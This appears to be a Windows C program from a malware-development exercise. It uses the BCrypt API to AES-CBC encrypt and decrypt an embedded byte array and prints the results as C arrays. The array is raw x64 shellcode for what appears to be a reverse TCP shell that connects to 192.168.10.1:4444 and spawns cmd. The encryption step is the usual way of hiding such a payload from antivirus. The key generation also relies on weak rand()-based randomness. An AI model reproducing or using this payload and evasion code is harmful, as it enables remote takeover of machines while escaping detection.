#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")
//Macro definitions
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define KEYSIZE 32
#define IVSIZE 16
//AES structure
typedef struct _AES {
	PBYTE pPlainText; // Pointer to the plaintext
	DWORD dwPlainSize; // Size of the plaintext
	PBYTE pCipherText; // Pointer to the ciphertext
	DWORD dwCipherSize; // Size of the ciphertext
	PBYTE pKey; // Pointer to the key
	PBYTE pIv; // Pointer to the initialization vector
}AES, *PAES;

//Geerate random bytes
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)(rand() % 0XFF); // Generate random byte
	}
}

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
	printf("unsigned char %s[] = {", Name);
	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X", Data[i]);
		}
	}
	printf("};\n\n\n");
}
//Encryption Part

BOOL InstallAesEncryption(PAES pAes) {

	NTSTATUS STATUS;
	BOOL bSTATE = TRUE;
	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE hKeyHandle = NULL;
	ULONG cbResult = NULL;
	DWORD dwBlockSize = NULL;
	DWORD cbKeyObject = NULL;
	PBYTE pbKeyObject = NULL;
	PBYTE pbCipherText = NULL;
	DWORD cbCipherText = NULL;

	//Initializing hAlgorithm as AES algoritm 
	STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptOpenAlgorithmProvider failed with error : 0x%0.8X \n", STATUS);
	}
	//Getting the block size of the AES algorithm
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
		if (!NT_SUCCESS(STATUS)) {
			printf("BCryptGetProperty failed with error : 0x%0.8X \n", STATUS);
			bSTATE = FALSE; goto _EndOfFunc;
		}
	//Getting the block size of the AES algorithm 
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptGetProperty failed with error : 0x%0.8X \n", STATUS);
	}
	//checking if the block size is 16 bytes
	if (dwBlockSize != 16) {
		printf("Block size is not 16 bytes\n");
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Allocating memory for the key object
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject); // Allocate memory for the key object
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Block cipher mode to CBC using 32 byte key and 16 byte IV
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptSetProperty failed with error : 0x%0.8x \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Generating the key object from AES key "pAes->pKey" using the algorithm "hAlgorithm"
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptGenerateSymmetricKey failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Runninb BCryptEncrypt to encrypt the plaintext "pAes->pPlainText" using the key "hKeyHandle" and IV "pAes->pIV"
	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptEncrypt failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Allocating memory for the ciphertext
	pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText); // Allocate memory for the ciphertext
	if (pbCipherText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Running BCryptEncrypt to encrypt the plaintext "pAes->pPlainText" using the key "hKeyHandle" and IV "pAes->pIV"
	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptEncrypt failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Clean up with EndofFunc
_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject); // Free the key object memory
	}
	if (pbCipherText) {
		// If everything worked, save pCipherText and cbCipherText to the AES structure
		pAes->pCipherText = pbCipherText;
		pAes->dwCipherSize = cbCipherText; // Save the size of the ciphertext
	}
	return bSTATE;
}
//Decryption Part
BOOL InstallAesDecryption(PAES pAes) {
	NTSTATUS STATUS;
	BOOL bSTATE = TRUE;
	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE hKeyHandle = NULL;
	ULONG cbResult = NULL;
	DWORD dwBlockSize = NULL;
	DWORD cbKeyObject = NULL;
	PBYTE pbKeyObject = NULL;
	PBYTE pbPlainText = NULL;
	DWORD cbPlainText = NULL;
	//Initializing hAlgorithm as AES algoritm
	STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptOpenAlgorithmProvider failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Getting the block size of the AES algorithm
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0); // Get the block size
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptGetProperty failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//checking if the block size is 16 bytes
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0); // Get the block size
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptGetProperty failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//checking if the block size is 16 bytes
	if (dwBlockSize != 16) {
		printf("Block size is not 16 bytes\n");
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Allocating memory for the key object
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject); // Allocate memory for the key object
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Setting the block cipher mode to CBC using 32 byte key and 16 byte IV
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptSetProperty failed with error : 0x%0.8x \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Generating the key object from AES key "pAes->pKey" using the algorithm "hAlgorithm"
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptGenerateSymmetricKey failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Running BCryptDecrypt to decrypt the ciphertext "pAes->pCipherText" using the key "hKeyHandle" and IV "pAes->pIV"
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptDecrypt failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	printf("Size of dwCipherSize: %lu\n", pAes->dwCipherSize);
	printf("Required plaintext buffer size: %lu\n", cbPlainText);
	//Allocating memory for the plaintext
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText); // Allocate memory for the plaintext
	if (pbPlainText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Running BCryptDecrypt to decrypt the ciphertext "pAes->pCipherText" using the key "hKeyHandle" and IV "pAes->pIV"
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("BCryptDecrypt failed with error : 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	//Clean up with EndofFunc
_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle); // Destroy the key handle
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0); // Close the algorithm provider
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject); // Free the key object memory
	}
	if (pbPlainText != NULL && bSTATE) {
		// If everything worked, save pPlainText and cbPlainText to the AES structure
		pAes->pPlainText = pbPlainText; // Save the plaintext
		pAes->dwPlainSize = cbPlainText; // Save the size of the plaintext
	}
	return bSTATE; // Return the state of the operation
}
// Wrapper function to perform AES encryption
BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {

	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;
	//Initialize the AES structure
	AES Aes = {
		.pKey = pKey,
		.pIv = pIv,
		.pPlainText = pPlainTextData,
		.dwPlainSize = sPlainTextSize
	};
	if (!InstallAesEncryption(&Aes)) {
		return FALSE; // Encryption failed
	}
	// Saving the ciphertext
	*pCipherTextData = Aes.pCipherText;
	*sCipherTextSize = Aes.dwCipherSize; // Save the size of the ciphertext
	return TRUE; // Encryption succeeded
}
// Wrapper function to perform AES decryption
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE; // Check for null pointers
	//Initialize the AES structure
	AES Aes = {
		.pKey = pKey,
		.pIv = pIv,
		.pCipherText = pCipherTextData,
		.dwCipherSize = sCipherTextSize
	}; // Initialize the AES structure
	if (!InstallAesDecryption(&Aes)) {
		return FALSE; // Decryption failed
	}
	// Saving the plaintext
	*pPlainTextData = Aes.pPlainText; // Save the plaintext
	*sPlainTextSize = Aes.dwPlainSize; // Save the size of the plaintext
	return TRUE; // Decryption succeeded
}

int main() {
	BYTE key[KEYSIZE];
	BYTE iv[IVSIZE];

	// Initialize random seed and generate key & IV.
	srand((unsigned int)time(NULL));
	GenerateRandomBytes(key, KEYSIZE);

	srand((unsigned int)(time(NULL) ^ key[0]));
	GenerateRandomBytes(iv, IVSIZE);

	// Optional: Print key and IV.
	PrintHexData("pKey", key, KEYSIZE);
	PrintHexData("pIv", iv, IVSIZE);

	BYTE ivBackup[IVSIZE];
	memcpy(ivBackup, iv, IVSIZE);

	// Define plaintext data.
	unsigned char Data[] = {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,
		0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,
		0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,
		0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
		0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
		0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,
		0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,
		0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
		0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
		0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
		0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,
		0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
		0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,
		0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
		0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
		0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
		0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,
		0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,
		0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,
		0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x0a,0x01,0x41,0x54,
		0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,
		0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,
		0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,
		0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,
		0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
		0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,
		0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,
		0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,0x64,0x00,0x00,0x00,0x00,
		0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,
		0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
		0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,
		0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,
		0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,
		0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,
		0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
		0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,
		0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
		0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
		0x89,0xda,0xff,0xd5
	};

	printf("Plaintext: %s\n\n", Data);

	// Encrypt the plaintext.
	PVOID pCipherText = NULL;
	DWORD dwCipherSize = 0;
	if (!SimpleEncryption(Data, sizeof(Data), key, iv, &pCipherText, &dwCipherSize)) {
		printf("Encryption failed.\n");
		return -1;
	}
	PrintHexData("CipherText", pCipherText, dwCipherSize);

	// Now, decrypt the ciphertext.
	PVOID pDecryptedText = NULL;
	DWORD dwDecryptedSize = 0;
	if (!SimpleDecryption(pCipherText, dwCipherSize, key, ivBackup, &pDecryptedText, &dwDecryptedSize)) {
		printf("Decryption failed.\n");
		HeapFree(GetProcessHeap(), 0, pCipherText);
		return -1;
	}
	PrintHexData("Decrypted PlainText", pDecryptedText, dwDecryptedSize);

	// Print the decrypted data as a string.
	printf("Decrypted Data: %s\n", (char*)pDecryptedText);

	// Free allocated memory.
	HeapFree(GetProcessHeap(), 0, pCipherText);
	HeapFree(GetProcessHeap(), 0, pDecryptedText);
	system("PAUSE");
	return 0;
}

